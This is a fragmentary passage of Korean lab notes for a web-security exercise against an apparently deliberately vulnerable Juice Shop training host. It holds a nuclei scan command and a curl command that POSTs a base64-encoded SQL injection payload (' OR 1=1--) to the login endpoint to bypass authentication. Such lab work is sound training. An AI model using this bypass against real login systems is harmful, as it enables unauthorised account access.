...
> 요청의 `Host: ...` 헤더(또는 `nuclei -u http://<vhost>`) 로 표적을 명시한다.
...
```bash
nuclei -u http://juice.el34.lab -t ~/nuclei-templates/http/technologies/tech-detect.yaml -t ~/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc | head -8
```
...
```bash
echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Content-Type: application/json" -d @/tmp/wv15.json http://juice.el34.lab/rest/user/login | head -c 100; rm -f /tmp/wv15.json  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
```
